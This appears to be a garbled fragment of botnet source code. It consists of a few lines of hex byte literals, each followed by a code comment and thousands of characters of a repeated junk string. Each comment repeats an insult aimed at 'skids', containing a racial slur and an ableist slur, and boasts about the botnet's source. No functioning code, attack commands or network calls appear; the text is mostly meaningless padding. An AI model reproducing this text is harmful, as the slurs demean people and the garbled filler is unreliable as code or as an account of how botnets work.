GGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BPHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x8f","\x90","\x91","\x92","\x93","\x94","\x95",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UHRS97BUHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
    "\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa",//random sting decision//GET THE FOCK OUTA HERE SKID RETARD ASS NIGGER MY BOTYNET SOURCE IS TO GODLY GFIUOEFASHF98UHES9UGHRS97BUP0\GHFDBVU97PHBVGUI9PHRWIPUBVHRSIOUPGBHIOPUSFDNHBVIUJFDSNBHVIUSRipuyvbriswpunbvihsrbviuybsriubviursbviubriuvbisrbvirswbvirwsbviyubrwiyvbwrivbirwbvirwbiuribirwbiwrsiurwiurnupiosbGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UGGFIUOEFASHF98UHES9UG
